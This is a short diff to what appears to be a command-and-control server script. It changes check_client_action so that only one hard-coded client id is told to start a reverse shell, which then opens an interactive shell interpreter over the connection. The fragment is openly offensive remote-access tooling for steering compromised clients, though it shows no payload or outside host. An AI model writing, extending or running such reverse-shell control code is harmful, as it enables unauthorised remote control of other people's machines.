@@ -29,7 +29,9 @@ def open_shell_interpreter(conn):
 
 def check_client_action(conn, data, data_processed):
 	print("[i] %s is checking for actions.." % data_processed['client_hashed_id'])
-	action = "reverse_shell"
+	action = "NONE"
+	if data_processed['client_hashed_id'] == "ffc2e2de561ac8ad95b81d9b34886e21":
+		action = "reverse_shell"
 	if action == "reverse_shell":
 		conn.send("reverse_shell")
 		open_shell_interpreter(conn)
